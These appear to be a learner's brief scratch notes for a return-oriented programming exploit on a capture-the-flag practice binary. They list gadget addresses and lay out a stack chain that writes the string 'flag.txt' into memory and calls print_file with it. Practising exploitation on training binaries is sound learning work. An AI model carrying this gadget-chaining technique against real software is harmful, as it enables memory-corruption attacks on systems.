0x0000000000400628: mov qword ptr [r14], r15; ret;
0x0000000000400690: pop r14; pop r15; ret;

I think I can ignore the preservation of r14/15 bc main doesn't use them

return back to main
call print_file
load rdi as string_addr
mov memory
filler



main
print_file
ret filler
string_addr
0x0000000000400693: pop rdi; ret;
0x0000000000400628: mov qword ptr [r14], r15; ret;
'/0'
string_addr + 8
0x0000000000400690: pop r14; pop r15; ret;
0x0000000000400628: mov qword ptr [r14], r15; ret;
"flag.txt"
string_addr
0x0000000000400690: pop r14; pop r15; ret;
filler
